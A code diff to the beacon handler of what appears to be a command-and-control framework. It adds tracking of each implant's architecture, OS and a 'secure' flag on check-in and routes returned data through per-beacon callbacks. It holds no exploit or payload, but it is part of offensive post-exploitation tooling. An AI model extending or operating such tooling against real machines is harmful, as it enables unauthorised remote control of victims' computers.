@@ -46,19 +46,14 @@ class Handler(object):
                     # clear the task
                     self.shad0w.beacons[beacon_id]["task"] = None
                     # inform user
-                    self.shad0w.debug.log(f"Beacon ({beacon_id}) received task", log=True)
+                    self.shad0w.debug.log(f"Beacon ({beacon_id}) received task\n", log=True, new=True)
                     return task
                 
                 # check if the data is for the current beacon
                 if beacon_id == self.shad0w.current_beacon:
                     # check if we should display the data
-                    if opcode == DATA_CMD_OUT:
-                        # need to find a nicer way to display the data
-                        sys.stdout.write(data)
-                    if opcode == DO_CALLBACK:
-                        callback = self.shad0w.beacons[beacon_id]["callback"]
-                        return callback(self.shad0w, data)
-                    return task
+                    callback = self.shad0w.beacons[beacon_id]["callback"]
+                    return callback(self.shad0w, data)
 
                 # another session has returned data
                 if beacon_id != self.shad0w.current_beacon:
@@ -82,6 +77,9 @@ class Handler(object):
                 username = request.form.get("username")
                 domain   = request.form.get("domain")
                 machine  = request.form.get("machine")
+                arch     = request.form.get("arch")
+                opsystem = request.form.get("os")
+                secure      = request.form.get("secure")
 
                 if username and machine and domain:
                     beacon_id = tools.generate_beacon_id()
@@ -97,6 +95,14 @@ class Handler(object):
                     self.shad0w.beacons[beacon_id]["domain"]       = domain
                     self.shad0w.beacons[beacon_id]["machine"]      = machine
                     self.shad0w.beacons[beacon_id]["username"]     = username
+                    self.shad0w.beacons[beacon_id]["arch"]         = arch
+                    self.shad0w.beacons[beacon_id]["os"]           = opsystem
+
+                    if secure == "SECURE":
+                        self.shad0w.beacons[beacon_id]["secure"]       = True
+                    else:
+                        self.shad0w.beacons[beacon_id]["secure"]       = False
+                        
                     self.shad0w.beacons[beacon_id]["last_checkin"] = str(datetime.now())
 
                     # send everytime it checks in, tells it whether to die of not
@@ -104,9 +110,9 @@ class Handler(object):
 
                     # let the user know whats happening
                     if domain != "NULL":
-                        self.shad0w.debug.log(f"Beacon: {domain}\\{username}@{machine} registered", log=True)
+                        self.shad0w.debug.log(f"Beacon: {domain}\\{username}@{machine} (ARCH: {arch}, OS: {opsystem}, Type: {secure})", log=True)
                     else:
-                        self.shad0w.debug.log(f"Beacon: {username}@{machine} registered", log=True)
+                        self.shad0w.debug.log(f"Beacon: {username}@{machine} (ARCH: {arch}, OS: {opsystem}, Type: {secure})", log=True)
 
                     # give the beacon there id, this is how we will identify them now
                     return self.builder.build(beacon_id=beacon_id, id=beacon_id)
